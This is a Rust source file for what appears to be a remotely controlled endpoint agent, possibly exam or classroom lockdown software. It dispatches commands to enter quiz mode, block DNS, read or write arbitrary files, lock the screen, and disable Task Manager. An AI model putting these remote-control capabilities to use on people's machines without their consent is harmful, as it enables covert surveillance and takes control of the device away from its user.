pub mod quiz;
pub mod files;
pub mod revert;

use crate::state::AgentState;

pub async fn execute_protocol(command: &str, state: &mut AgentState) -> (String, i32) {
    let protocol_cmd = command.strip_prefix("PROTOCOL:").unwrap_or("");
    let parts: Vec<&str> = protocol_cmd.split('|').collect();
    
    if parts.is_empty() {
        return ("Invalid protocol command".to_string(), 1);
    }

    let protocol_name = parts[0];
    
    match protocol_name {
        "QUIZ_MODE" => {
            if parts.len() < 2 {
                return ("Quiz mode requires URL parameter".to_string(), 1);
            }
            let url = parts[1];
            quiz::quiz_mode_activate(state, url).await
        }
        "BLOCK_DNS" => crate::network::dns::block_dns(state).await,
        "BLOCK_DNS_WHITELIST" => {
            if parts.len() < 2 {
                return ("Whitelist mode requires allowed domains".to_string(), 1);
            }
            let whitelist = parts[1..].to_vec();
            crate::network::dns::block_dns_whitelist(state, whitelist).await
        }
        "GET_FILE" => {
            if parts.len() < 2 {
                return ("Get file requires path parameter".to_string(), 1);
            }
            let path = parts[1];
            files::get_file(path).await
        }
        "UPLOAD_FILE" => {
            if parts.len() < 3 {
                return ("Upload file requires path and content parameters".to_string(), 1);
            }
            let path = parts[1];
            let content = parts[2..].join("|");
            files::upload_file(path, &content).await
        }
        "REVERT_ALL" => revert::revert_all_changes(state).await,
        "LOCK_SCREEN" => crate::system::process::lock_screen().await,
        "DISABLE_TASK_MANAGER" => crate::system::registry::disable_task_manager().await,
        "ENABLE_TASK_MANAGER" => crate::system::registry::enable_task_manager().await,
        _ => (format!("Unknown protocol: {}", protocol_name), 1),
    }
}
